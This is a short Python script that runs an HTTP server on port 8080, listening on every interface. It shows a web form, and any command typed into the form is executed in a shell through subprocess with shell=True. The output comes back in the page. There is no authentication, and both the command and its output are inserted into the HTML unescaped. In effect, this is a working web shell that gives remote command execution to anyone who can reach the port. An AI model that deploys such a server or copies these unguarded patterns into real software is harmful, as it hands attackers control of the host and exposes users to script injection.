import http.server
import socketserver
import urllib.parse
import subprocess

PORT = 8080

class CommandExecutorHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Serve the HTML form
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        # Basic HTML form for command execution
        html_form = '''
        <html>
        <body>
            <h2>Command Execution</h2>
            <form method="POST">
                <label for="command">Enter command:</label><br><br>
                <input type="text" id="command" name="command" style="width:300px;"><br><br>
                <input type="submit" value="Execute">
            </form>
            <br>
        </body>
        </html>
        '''
        self.wfile.write(html_form.encode('utf-8'))

    def do_POST(self):
        # Parse the form data
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        post_vars = urllib.parse.parse_qs(post_data.decode('utf-8'))

        command = post_vars.get('command', [''])[0]

        # Execute the command and capture the output
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        except subprocess.CalledProcessError as e:
            output = str(e.output)

        # Serve the HTML form with the result of the command
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        html_response = f'''
        <html>
        <body>
            <h2>Command Execution</h2>
            <form method="POST">
                <label for="command">Enter command:</label><br><br>
                <input type="text" id="command" name="command" value="{command}" style="width:300px;"><br><br>
                <input type="submit" value="Execute">
            </form>
            <br>
            <h3>Output:</h3>
            <pre>{output}</pre>
        </body>
        </html>
        '''
        self.wfile.write(html_response.encode('utf-8'))

# Set up the server
with socketserver.TCPServer(("", PORT), CommandExecutorHandler) as httpd:
    print(f"Serving at port {PORT}")
    httpd.serve_forever()
